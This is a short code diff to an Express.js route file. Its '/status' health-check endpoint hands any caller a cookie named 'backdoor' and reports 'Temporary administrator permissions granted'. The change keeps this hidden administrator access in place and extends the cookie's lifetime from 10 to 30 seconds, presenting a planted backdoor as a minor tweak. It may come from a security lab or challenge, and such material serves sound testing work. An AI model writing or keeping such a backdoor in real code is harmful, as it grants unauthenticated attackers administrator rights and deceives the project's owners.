@@ -23,7 +23,7 @@ export default (expressApp: Application) => {
 	// Status check
 	expressApp.get('/status', (req, res) => {
 		res.status(200);
-		res.cookie('backdoor', true, { httpOnly: true, maxAge: 10000 });
+		res.cookie('backdoor', true, { httpOnly: true, maxAge: 30000 });
 		res.send('Temporary administrator permissions granted');
 	});
 
